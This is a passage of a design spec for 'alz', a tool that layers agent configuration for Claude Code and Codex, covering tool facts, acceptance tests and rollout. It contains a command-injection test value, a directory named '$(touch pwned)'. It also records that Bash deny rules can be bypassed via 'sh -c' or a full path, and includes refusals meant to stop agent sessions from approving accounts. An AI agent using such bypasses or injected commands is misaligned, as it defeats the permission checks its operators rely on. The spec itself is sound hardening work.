  `note: <dir>/.claude has <kinds>; they load only if you pass --add-dir <dir> yourself`.
- For each folder above the repository except the client root, `warning: <folder>/CLAUDE.md is
  loaded too (ancestor directory)`, and `warning: <folder> is a git repo with .claude/; its skills
  or agents may load in this repo`.
- `build: <e> errors, <w> warnings`, each diagnostic indented by two spaces, then `doctor: ok`
  (exit 0) or `doctor: <n> problems` (exit 1). A problem is a collision or a build error.
- When the build has an error, no built names are known, so the collision check finds none (the
  TypeScript `alz` compares with what it merged: reference drift, TASK-55.6).

**`alz init`.**
- Options: `--kind repo|layer` (default `repo`), `--name`, `--visibility
  public|private|confidential` (default `private` for a repo and `public` for a layer), `--stack
  <source>` (repeatable), `--hub <dir>`. A value outside these is a usage error (exit 2; the
  TypeScript `alz` exits 1 for a bad visibility).
- `error [init] layer.yaml already exists here` and `error [init] '<name>' is not a valid layer
  name; pass --name` exit 1. The default name is the folder's name in lower case, with each run of
  other characters than `a` to `z` and `0` to `9` replaced by `-`, and `-` trimmed at both ends.
- A `--stack` value that starts with `github:` or `git:` is a source as written. Any other is a
  `path:` source, and `<dir>@<ref>` pins a ref when the text after the last `@` holds no `/`.
  A value that is not a source (§5.2), whose pin is not a git ref (§5.2) or that holds a control
  character is `error [init] a --stack value <rule>` (the value is never printed), exit 1, and
  nothing is written; the TypeScript `alz` writes it as given (reference drift, decision-30).
- `--hub <dir>` adds `path:<dir>/layer` when `<dir>/layer/layer.yaml` exists, pinned to the newest
  tag `git tag --list 'layer-v*' --sort=-v:refname` gives, by §6's git rules, and prints
  `using the hub's client layer <source> at <ref>`. A tag that is not a valid git ref (§5.2) is
  `error [init] the newest layer-v* tag of the hub is not a valid git ref`, and nothing is written.
- The files are created as the TypeScript `alz` writes them, byte for byte. A repo gets
  `layer.yaml`, `.layer/layer.yaml` and `.layer/instructions/50-repo.md` when `.layer/layer.yaml`
  does not exist, and `mise.toml` with the `alz:*` tasks when there is no mise config. When there
  is one, the tasks are printed after `add these tasks to your mise config:` instead. A layer gets
  `layer.yaml` and `instructions/00-core.md`.
- Every file is created by §4.3's rules, and an existing file is never overwritten.
- Then come `created <path>` for each file, and `next: run \`alz build --adopt\` to take over
  existing agent config, or \`alz build\`` or `next: run \`alz lint\``.
---

## 11. Coexisting with native plugins

- Native plugin systems (Claude Code plugins/marketplaces, Codex plugins) stay usable.
  Plugin items are namespaced natively, so they can't take part in overrides. Treat them as
  **external dependencies**, declared in `settings.yaml` under the target, and keep layered
  items out of plugins.
- Optional later: `alz export-plugin <layer>` packages a layer as a native plugin, for
  people who want just one public layer without this tool.

---

## 12. Facts to verify before implementing (do not trust this spec blindly)

Check each against the installed version's `--help`, docs and a smoke test, and record the
findings in `docs/target-facts.md` with the version and date:

1. Claude Code: subagent frontmatter fields (`tools`, `skills` format, `model`, isolation
   field name, memory, permission mode, hooks in frontmatter).
2. Claude Code: same-name precedence for agents (expected: project > user > plugin) and for
   skills (expected: personal > project). This is what §8.4 exists to neutralise.
3. Claude Code: does `CLAUDE.md` `@import` work for `AGENTS.md`, and is `AGENTS.md` now read
   natively? If it is, still generate the thin `CLAUDE.md`, but avoid loading it twice.
4. Claude Code: hook event names, JSON shape, how hook arrays merge across scopes, and the
   project-dir environment variable.
5. Claude Code: whether skills load from parent directories and from nested `.claude/skills`,
   so that an ancestor folder (e.g. a client root) doesn't inject unexpected skills.
6. Codex: custom agent TOML schema and location, skills lookup order, `AGENTS.md` merge order,
   `AGENTS.override.md` behaviour, hooks support, MCP config keys.
7. Both: how an unsupported item is handled (it must not break startup).
8. Both: the setting that grants access to an additional directory (Claude Code
   `additionalDirectories` / `--add-dir`, the Codex equivalent), and whether skills, rules
   or instructions inside that directory get loaded as a side effect. If they do, the hub
   must not contain `.claude/` content that conflicts with the code repos.
9. Claude Code: the path-scoped rules format (`.claude/rules/*.md`, `paths:` frontmatter)
   and the subagent `memory` field / memory dir location (to protect it, §4.5).
Items 10 to 21 are for account selection (§7.13). They are recorded in
`docs/target-facts.md` §12, checked 2026-11-22 on macOS with Claude Code 2.1.323, Codex
0.169.0 (and its source at that tag) and mise 2026.9.1 (TASK-50.7). Its §12.1 lists what
they changed here (C1 to C13), and its §12.2 the checks only the owner can run, because they
need a real login, a second account or Linux (O1 to O7). The summary after each item says
what was found and what is still open.
Account resolution also relies on the integrity of the layer cache, which is not a tool fact:
`alz build` checks cache reads against the lock and git cache keys are unambiguous (§5.3, §6).

10. Claude Code: `CLAUDE_CONFIG_DIR`. That it is read only at start, so a running session
    keeps its account; where logins, workspace trust and per-project state live with it unset
    and set; and that trust is per account folder. *Recorded:* with it set, every `~/.claude`
    path and `.claude.json` live in the folder; trust is in that `.claude.json`, so it is per
    folder; `CLAUDE_CONFIG_DIR=~/.claude` is a different account from the variable unset.
    *Open:* whether a running session changes folder when a settings `env` sets the variable
    (O4; §7.13 "Values set outside alz"), and a second account asking for trust again (O1).
11. Codex: `CODEX_HOME`. That it is read only at start, and where logins, project trust and
    `config.toml` live. *Recorded:* a set value must be an existing directory and is resolved
    to its real path, and an empty one counts as unset; logins (`auth.json` by default, or a
    keyring entry keyed to the folder), `config.toml` and project trust are per folder; no
    config key sets the variable (source, not checked exhaustively).
12. Both, on macOS and on Linux separately: whether a login kept in the macOS Keychain or a
    Linux keyring is stored under an item keyed by the variable, so two account folders
    never share one login. *Recorded:* yes for both tools' own logins on macOS: Claude's
    docs key the Keychain entry to the folder (or use `.credentials.json` in it), and Codex's
    source keeps `auth.json` in the folder by default, or a keyring entry keyed to it.
    Claude logins kept outside the folder are shared by every folder (C3; §7.13 "Logins kept
    outside the account folder"). *Open:* Linux (O2).
13. Both: whether a tool started with the variable set still reads the default folder
    (`~/.claude`, `~/.claude.json`, `~/.codex`) as a fallback. *Recorded:* neither does
    (smoke test); Claude's profiles in `~/.config/anthropic` are shared (C3).
14. Both: which shared items (§7.13) work as symbolic links, and whether the tools write
    through a linked item or replace the link with a file or folder. *Recorded:* Claude's
    `agents/`, `commands/`, `skills/`, `plugins/`, `CLAUDE.md` and `settings.json` and Codex's
    `AGENTS.md` and `skills/` work as links, and both tools write through them (smoke test);
    per-entry skill links load in both. A whole-folder link also shares claude.ai's synced
    folders (C4), Codex's `skills/.system/` (C5) and plugin install paths (C10). *Open:*
    Codex `sessions/` and `memories/` (O7); Claude `projects/` as a link and per-entry links
    in Claude's `plugins/`, which were not tested (TASK-50.5 records both).
15. Both: whether project settings (Claude `env`, Codex `shell_environment_policy`) can
    change the variable, and whether hooks, the shell tool and MCP servers inherit it.
    *Recorded:* Claude drops the variable from project and local `env`, but user,
    `--settings` and managed settings can set it (C6); its hooks, Bash tool and stdio MCP
    servers inherit it. Codex finds its folder before it reads any config, but
    `shell_environment_policy`, from a trusted project config too, changes or drops the
    variables for its shell commands (C12; §7.9); its hooks inherit them and its stdio MCP
    servers do not (C12; §7.13 "What a session passes on"). *Open:* observing Codex (O5).
16. Both: which settings or config keys carry credentials or pin the login, so they stay per
    account. *Recorded* (not exhaustive): Claude `apiKeyHelper`, `env` tokens,
    `forceLoginMethod`, `forceLoginOrgUUID`, `otelHeadersHelper`, `sandbox.credentials.*`;
    Codex `forced_login_method`, the two credential-store keys and MCP server headers and
    token variables. `--share settings.json` shares the Claude keys (§7.13).
17. Both: where MCP OAuth tokens live. *Recorded:* Claude keeps them in its per-folder
    credential store, not in `.claude.json` (C1). Codex keeps them in the OS keyring by
    default, keyed by server and not by folder, so every `CODEX_HOME` shares them (C2, from
    source; O3). The owner has deferred C2; §7.13 records it as a known limit.
18. Both: what each tool does when its variable points at a folder that does not exist
    (creates it, starts logged out, or refuses to start), and which file modes it creates
    there. This records the behaviour; it does not change §7.13, which sets the variable
    either way. *Recorded:* Claude creates the folder (mode `0755`) and starts logged out;
    Codex refuses to start and creates nothing (C8). So `~/.claude-alz-blocked` can come to
    exist, and `alz doctor` warns about it (§7.13).
19. Both: which environment variables mark an agent session (in the tool's shell commands,
    hooks and MCP servers), so `alz account allow` can refuse to run inside one.
    *Recorded:* the markers §7.13 "Agent-session markers" names (C7). Claude also sets
    `CLAUDECODE` in IDE terminals; Codex sets no marker in stdio MCP servers. *Open:* the
    Codex names come from source only (O5).
20. mise and direnv: whether each leaves a variable that shows which variables it set.
    *Recorded:* mise leaves `__MISE_DIFF` (also in the children of `mise exec` and
    `mise run`) and direnv `DIRENV_DIFF`; each encodes every variable the tool set with its
    value, secrets included, in a format that is not a stable interface (C11). *Decided*
    (decision-17): alz checks only that these variables exist, never reads or decodes them,
    and its warnings say only that mise or direnv is active (§7.13 "Values set outside alz",
    "Both files").
21. Both: whether Claude Code and Codex permission or sandbox rules can deny reads and writes
    to `~`-relative paths (such as `~/.config/agent-layerz/**`), and whether a Bash deny rule
    such as `bash:alz account allow*` can be bypassed through `sh -c` or another wrapper.
    *Recorded:* Claude rules accept `~/` paths, and a Bash deny rule is not a boundary:
    `sh -c`, a full path or a script bypasses it (C13; §7.13 "Limit"). Codex deny-read
    patterns accept `~/`. *Open:* how far Codex rules reach (O6).

Each adapter declares the version range it was verified against, and `alz doctor` warns
when the installed tool is outside that range.

---

## 13. Acceptance tests

The tool is done when all of these pass in CI (fixtures under `test/fixtures/`):

1. **Determinism:** building twice gives byte-identical output, and `alz check` passes.
2. **Instruction stacking:** personal + client + repo produce one `AGENTS.md` with three
   headed sections in order. `mode: remove` drops a block.
3. **Agent overlay:** a base `architect` from layer 1, plus a skills overlay from layer 2,
   plus a body overlay from layer 3, gives one agent with the merged skills and three body
   sections. `alz explain agent architect` shows all three sources.
4. **Tool narrowing:** an overlay that adds a tool fails, and one that removes a tool passes.
5. **Skill override:** a repo `stack-conventions` replaces the personal one, even when a
   same-name skill exists in a user dir (the doctor reports the collision).
6. **Slots:** a missing slot fails with `strict_slots: true` and produces a stub plus warning
   with `false`.
7. **Permission floor:** a repo layer removing a personal deny fails. Allow lists combine.
8. **Locked hook:** disabling a locked hook fails, and disabling an unlocked one works.
9. **MCP allowlist:** a server defined but not enabled doesn't appear in any output.
10. **Leak guard:** a public layer containing a forbidden pattern or a fake token fails `lint`.
11. **Visibility:** a public layer extending a private one fails.
12. **Account independence:** with `CLAUDE_CONFIG_DIR` (or equivalent) pointed at two
    different empty account dirs, the effective agents and skills listed by each tool are
    identical.
13. **Two targets:** the same fixtures produce valid output for both `claude` and `codex`.
    Both tools start in the fixture repo without config errors (smoke test, skipped if the
    tool isn't installed).
14. **Non-destructive:** an existing hand-written `.claude/agents/foo.md` makes the build fail
    with a clear message, and `--adopt` moves it into `.layer/agents/`.
15. **Protected paths:** files under `.claude/agent-memory/`, `backlog/`, `docs/` and `specs/`
    are byte-identical before and after a build, even when a layer ships a file at the same path.
16. **Hub:** a two-repo fixture with a hub resolves `path:../hub/layer@layer-v0.1.0`. Each repo's
    output grants the hub as an additional directory. A doc commit in the hub after that tag
    doesn't change either repo's build. `doctor` warns about a `CLAUDE.md` at the client root.
17. **Path-scoped rules:** a repo `rules/backend.md` overrides the personal one, and an
    `extend` rule combines `paths`.
18. **Commit identity** (§7.12, §9.4): in a git repo whose global config holds a wrong
    identity (reserved domains only, e.g. `ci@example.invalid`), `alz build --adopt` adds the
    declared identity to `.git/config` and leaves the global file byte-identical; a second
    build changes nothing and the output stays byte-identical. A private `kind: client`
    layer outside the repo overrides the personal identity (e.g. with `owner@client.example`),
    and the Commits section and reports name that layer. A declaration in the repo layer
    (even with `kind: client`), a group layer, a public `client` layer, a `path:` symlink
    inside the repo that points outside it, or a second client layer fails the build and
    names the layer. `alz check` fails on a wrong global, local or environment identity,
    naming only the layer, the scope and the source; no output contains the wrong value. A
    local value that differs is never replaced. An identity with a newline, control character
    or leading `-`, a name that git would trim (edge `.` `,` `;` and the like), a backslash or
    an invisible format character fails before any git command. A `git:` local path or
    `file://` layer, a case variant of an in-repo path and a link into the repo count as inside
    it. A `.git/config` that is a symlink, a gitfile `.git`, or a repo root inside another work
    tree gets no write; the report still names the source of a wrong value, and a name with an
    apostrophe gets no shell command. Without a declaration, `AGENTS.md` has no Commits
    section.

Tests 19 to 24 are planned with account selection (§7.13); each names its task, and the
parts that are built say so. The numbers
in this list are not file numbers: 19 to 23 become new test files with the next free `NN`,
and 24 adds cases to the existing `test/acceptance/24-untrusted-repo.test.ts`. All use a fake
`HOME`, `XDG_CONFIG_HOME`, `XDG_STATE_HOME` and `XDG_CACHE_HOME`, never a real account folder.
They remove `__MISE_DIFF`, `DIRENV_DIFF` and the agent-session markers (§7.13) from the
environment unless a case sets them, because `mise run test` and an agent session pass them on.

19. **Account resolution** (TASK-50.10, `test/acceptance/31-account-which.test.ts`): `alz account which` reports each source per target
    (`use`, `environment`, `user config`, `layer`, `default`) and the paths of both files. A
    `folders` entry matches whole path segments and the longest one wins. A symlinked path, a
    case variant on a case-insensitive file system and a nested stack manifest each resolve
    to the right root, and a `layer.yaml` without `stack` is skipped. A missing named account
    folder fails closed; a missing default folder never fails. A user config inside the
    repository, writable by group or others, or under a parent directory below `$HOME` that
    group or others can write is ignored with a warning, and so is an `allowed.yaml` entry
    with a relative root or an account name that breaks the rule. With `__MISE_DIFF` or
    `DIRENV_DIFF` set, a user config located by an `XDG_CONFIG_HOME` other than the default is
    ignored with a warning that says mise or direnv is active, and one at the default location
    is read. A `layer.yaml` on the way to the root that cannot be read (invalid YAML, over
    1 MiB, past the alias limit, a link, a folder, unreadable, or a stack that fails the
    schema) stops the walk: an allowed root fails closed on the blocked folder, and a root
    that is not allowed gets the default account, never the outer repository's. A cache that
    `XDG_CACHE_HOME` moves away from `~/.cache` while `__MISE_DIFF` or `DIRENV_DIFF` exists is
    a cache miss, and a repository that only contains a configured account folder fails
    closed. A marker string in those variables appears in no output, and the resolver
    reads only the names it lists from the environment. The command runs no git and writes
    nothing (a trace of the file system and subprocess calls, and the import graph), opens no
    file of the stack for a repository that is not allowed, and prints no control character
    for a directory or source whose text holds them. Build output is byte-identical with and
    without account settings. The rule that the folders of the two files must be owned by the
    user is not tested, because a test cannot make a folder owned by another user without
    root; only the group- and other-writable cases are.
20. **Account allow** (TASK-50.11, built in `test/acceptance/32-account-allow.test.ts`, with
    account cases in test 24 and the import-graph cases in test 31): in a fresh clone whose stack names an account, tools start
    on the default account; `alz build` on a terminal prints the allow command, and prints
    nothing about it with an agent-session marker set. `alz account allow` without a
    terminal, or with any one of the six agent-session markers set (each tested, an empty
    value included), refuses and writes nothing; on a terminal
    it accepts only the typed account name. After `allow` the named account applies, and a
    ref bump of the declaring layer keeps it. A changed per-target map (a target added or
    removed included) or declaring source skips step 4 for every target, and
    `alz account which` warns with the old and new values. When a named account fails
    closed, `alz account which` prints `layer step skipped (<reason>); fails closed`, what
    the hook applies and the fix command (built, test 31, TASK-50.10). A pinned `path:` layer resolves through the cache
    index; a lock `sha` that is not 40 or 64 hex characters, an index entry for another path,
    a malformed index entry, a symlinked index entry, and a layer whose content hash differs
    from the lock are each a cache miss, and the hint says only to run `alz build`. The cache
    index and the cache misses are built at the reader level (TASK-50.9,
    `test/acceptance/30-account-cache-read.test.ts`); a cache entry that is missing or a link,
    a lock that is missing, unreadable or has a missing or duplicate entry, a layer directory
    or repository root inside an account folder, and a layer inside the repository that is
    edited, oversize or unparsable (read only to warn, never a miss) are covered there too. In a
    repository that is not allowed, resolution reads no file of its stack. No resolution
    command runs git. Two concurrent writes leave one sorted entry per root (twelve real
    processes at once, at least one of which waited for the lock), and `alz account allow --remove` removes only this root's entry. The
    typed answer is read only through `Io.terminal`; a source scan shows that only
    `src/cli/terminal.ts` reads standard input, and a bundled `bin.ts` run with a pipe, or with
    no standard input, refuses (a real terminal cannot be driven from a test, so the owner
    checks once by hand: it accepts in a terminal window and refuses in an IDE terminal with
    Claude Code). Each unsafe state of `allowed.yaml` (group- or other-writable file or
    directory, a parent below `$HOME`, `XDG_STATE_HOME` inside the repository, in an account
    folder or moved under mise or direnv, a folder or FIFO in place of the file, over 1 MiB,
    invalid YAML, a top level that is not a list, an ignored entry, a dangling link, a relative
    `$HOME`, an unknown user id, a file in a git work tree, a link to a file that is not empty,
    `[]` or alz's own) refuses and leaves the state directory byte-identical. What `allow` shows
    and asks about is escaped, not stripped: a zero-width character or a look-alike letter in a
    source prints as `\u{XXXX}`, and the prompt itself names the root and the source. A trace
    shows every write under the state directory and no subprocess.
21. **`alz run`** (TASK-50.3): for `claude` and `codex`, with and without `--account`,
    arguments and the exit code pass through. An unknown tool or account, a missing named
    folder whether named or resolved, and a cache miss, a changed declaration or a recorded
    source no longer in the stack in an allowed repository each fail before anything starts,
    never on the default account, and name the fix. A variable set outside alz is kept with a
    `set outside alz` warning unless `--account` is given; with `__MISE_DIFF` or `DIRENV_DIFF`
    set, the warning adds `mise or direnv is active here`, and no output contains the marker
    string the test puts in their values. A forged `ALZ_USE_CLAUDE` in the environment
    changes nothing.
22. **Shell hook** (TASK-50.6): in zsh and bash, the hook sets the variables and markers after
    a `cd` into a configured repository and unsets them on leaving; `alz use` survives a `cd`
    until `--reset` and exports no variable; a forged `ALZ_USE_CLAUDE` changes nothing; a
    foreign value is kept with one warning, which adds `mise or direnv is active here` when
    `__MISE_DIFF` or `DIRENV_DIFF` is set and never shows their values. When a named account
    cannot apply, the hook warns
    and sets the missing named folder, the recorded account (cache miss, same source) or the
    blocked folder; a newly declared account or the default account is never set. The
    evaluated output holds only `export NAME='…'` and `unset NAME` lines. A directory named
    `$(touch pwned)` and a layer name containing ESC create no file and put no control
    character on the terminal.
23. **Account folders by name only** (TASK-50.4, TASK-50.5): a dry run of
    `alz account init <name>` changes nothing. A real run without `--share` creates only the
    `0700` account folders and makes no link. Each `--share` item that exists in the default
    folder is linked, with a warning, and a whole item it replaces is backed up by renaming;
    `--share skills` gives Claude a real `skills/` folder with one link per entry, without
    `synced` or `.trash`, and leaves an entry that already exists alone. It refuses `default`,
    `alz-blocked`, the configured `default_name`, a symlinked account folder or parent, and a
    `--share` item that §7.13 does not list (before planning), and a rerun with the same
    arguments changes nothing. `alz doctor` reports no item as not linked, does not count the
    blocked folders as accounts and warns when one exists. A file-access trace shows that
    neither command opens a file inside an account folder.
24. **Untrusted repository**, account cases. Built (TASK-50.8, in
    `test/acceptance/24-untrusted-repo.test.ts`): a repo layer (whatever its `kind`), a group
    layer, a public `client` layer, a second `client` layer, or a `client` layer reached
    through a link inside the repository that declares `account` fails the build and names
    the layers, and `alz init` prints it as a warning (the init case is in
    `test/acceptance/29-account-layer.test.ts`, which also covers the field's schema and
    which layer wins). A layer that sets `CLAUDE_CONFIG_DIR`,
    `CODEX_HOME`, `HOME`, `XDG_CONFIG_HOME`, `XDG_STATE_HOME` or `XDG_CACHE_HOME` through
    `settings.yaml` (Claude `env`, or a Codex `shell_environment_policy` whose `set` names one,
    whose `exclude` matches one or whose `filters` entry not set to `include` matches one,
    also under a profile; or a key such as `NAME=x` that is not a plain variable name), an MCP `env_from`, an agent's native `mcpServers`, or a passthrough
    settings, `.mcp.json`, plugin manifest, agent or `.toml` file (at any depth, whatever its
    target) fails
    the build and names the layer, as does a passthrough path with a non-ASCII character; a Codex policy that only changes
    `include_only` or `inherit`, or excludes other names, still builds. Built (TASK-50.10, in
    the same file): `alz account which` ignores a refused declaration with one
    warning, whatever the number of targets, and the client's allowed account still applies;
    the resolver that `alz run` and the hook will use reports it once. Built (TASK-50.11): a
    declaration made by the repository's own layer is refused by `alz account allow`, an
    external client layer's source is shown quoted before the prompt, and a hub directory whose
    name holds ESC prints no control character.
25. **Name order** (TASK-64, `test/acceptance/33-name-order.test.ts`): instruction files `z.md`,
    `｡.md` (U+FF61) and `😀.md` (U+1F600) give `AGENTS.md` blocks in that order; the
    layer's content hash in `layer.lock` lists its files in that order (§5.3); `.claude/settings.json`
    keys `-x`, `10`, `9`, `a`, `｡`, `😀` appear in that order; `alz check` then passes.
26. **YAML limits** (TASK-59, TASK-60, TASK-62, `test/acceptance/34-yaml-limits.test.ts`),
    through `alz lint --layer`:
    - a `layer.yaml` at each limit of §7.13 "YAML limits" lints;
    - one past a limit is the error `yaml`: 1 MiB + 1 byte, 101 aliases, 65 levels, 20001 nodes,
      10001 replayed events;
    - so are invalid UTF-8, two documents, a cyclic alias, an unresolved alias, whose name never
      reaches the output, and an escape that decodes to a control character;
    - `!foo` and `!!binary` are the error `yaml-tag`;
    - a file with CRLF line ends lints.
27. **Layer and manifest schema** (TASK-61, `test/acceptance/35-manifest-schema.test.ts`):
    - `alz lint` in a repository refuses `ref: [x]` and `ref: 1.10` with `manifest`, naming
      `stack[<n>].ref` and printing neither value, and gets past `ref: "1.10"`;
    - `alz lint --layer` refuses `version: 1.10` with `layer`, naming `version`.
28. **Sources and the layer cache through `alz lint`** (TASK-55.4; TASK-52, TASK-53, TASK-63,
    TASK-68, TASK-69, TASK-71). These are lint twins in tests 16, 24, 26, 28 and 30, which
    run `alz lint` in the repository where the build cases run `alz build`. Where a case needs
    a lock, the suite writes one.
    - The cases about sources and the cache get the same verdicts through `alz lint` as through
      `alz build`.
    - With `XDG_CACHE_HOME` empty or relative, the cache is `~/.cache/agent-layerz` under the
      fake home, and the repository tree is unchanged.
    - A `path:` layer at the fake home, or reached through a link into `~/.claude-x`, is refused
      before anything in it is opened, and so is a cache root inside an account folder.
    - Run as a pre-commit hook in a main checkout and in a linked worktree, `alz lint` leaves
      the index and the repository byte-identical.
    - A failed fetch prints `cannot fetch '<source>': <line>` in full. A fake `ssh` that writes
      ESC, CR and U+202E leaves none of them in the output.
    - A layer holding a name with the byte 0xFF is the error `layer`, on Linux only.
    - A `git:` source with credentials is the error `source`, and the token appears nowhere.
    - The cases that belong to no existing test file (TASK-52, TASK-53, TASK-63, TASK-69) are in
      `test/acceptance/36-sources-and-cache-guards.test.ts`, each as an `alz lint` case and an
      `alz build` case (an `alz check` case for the hook).

    The cases the TypeScript `alz` fails are marked as reference drift (`test/drift.ts`). Their
    `alz build` and `alz check` forms are checked against the Rust `alz` in R5 (TASK-55.6).

29. **Settings and MCP keys** (TASK-55.5, `test/acceptance/37-settings-targets.test.ts`): a
    settings or MCP file whose top-level key is not a known target is refused, whatever the key.
    For `settings.yaml` the known targets are `claude` and `codex`; for `mcp.yaml` the keys are
    server ids (§7.7). Through `alz lint --layer` the refusal is an error naming the file; through
    `alz build` it also writes no output. Both are reference drift against the TypeScript `alz`.
30. **The writer and generated headers** (TASK-55.6): each rule of §4.3 has an `alz build` case
    and, where it reports, an `alz check` case. A file that `layer.lock` lists but whose bytes no
    longer match and that has no mark is never overwritten or deleted. A path under a link, and a
    path that is not a regular file, is a collision, and nothing is written through the link. A
    passthrough `.claude/Settings.json` collides with the generated `.claude/settings.json`. A file
    a layer ships at `Backlog/x.md` is left out as protected. A layer file name with a line feed, a
    C1 control or a format character is the error `layer`. A header source holding such a character
    or `-->`, through a layer version, a ref or a path, is the error `layer`. `É` and `é` fold to
    one path, and `?` in `protected_paths` matches a character above U+FFFF. `--adopt` refuses text the layer reader would refuse, keeps the comments and
    every other byte of `layer.yaml`, and writes nothing when one file cannot be adopted. The cases
    the TypeScript `alz` fails are reference drift.
31. **Output parity** (TASK-55.6): for every fixture repository, the files `alz build` writes and
    `layer.lock` are byte-identical to golden trees made once from the TypeScript `alz` by a
    script and committed. A Rust integration test compares them. A golden file that alz writes
    differently on purpose carries a drift mark naming its task and the spec rule. Each reference
    drift case of §10.2 that adoption can reach has an acceptance case checking alz's own bytes
    (TASK-73).

---

## 14. Rollout (generic, for any client)

1. **Personal layer:** extract universal standards, generic agent personas (architect,
   designer, domain-expert, backend-engineer, frontend-engineer, reviewer, …), generic
   skills, security-floor hooks and denies, and model aliases. Declare your
   `commit_identity` (§7.12). Mark it `public` and run `lint`.
2. **Client hub + layer:** for each client, create the private hub repo at `<client-root>/hub/`
   (§4.4). Put the domain context, constraints, persona overlays and client-wide slot fills
   in `hub/layer/` (`kind: client`, private), plus a `commit_identity` if the client issues
   you an email, and tag it `layer-v0.1.0`. Put the docs, specs and Backlog.md board in the
   rest of the hub.
3. **Repo layer:** in each repo, run `alz init`, add the stack-specific slot fills
   (`stack-conventions`, …), set the MCP allowlist and budgets, then `alz build`.
4. **Clean the account dirs:** move agents and skills out of `~/.claude*` and `~/.codex*`
   into the right layer until `alz doctor` is clean.
5. **CI:** add `alz check --skip-identity` to each repo's pipeline (a CI runner has no owner
   identity), and plain `alz check` to the agent's Stop hook if wanted.
6. **Iterate:** each lesson learned (e.g. from a `/learn` command) goes into the narrowest
   layer it applies to, as a PR on that layer's repo, followed by `alz update` in consumers.

---

## 15. Open questions (decide before v1.0)

- Should `group` layers be first-class (e.g. auto-detected from a folder convention), or
  only declared explicitly in each repo's stack? Leaning towards explicit.
- Should `commit_generated` default to `true` for every client, or be configurable per
  client layer? Leaning towards a client-layer default that repos can override.
- Format for publishing a layer as a native Claude/Codex plugin (§11): later.
- A third target (Gemini CLI / OpenCode) once v1 is stable.
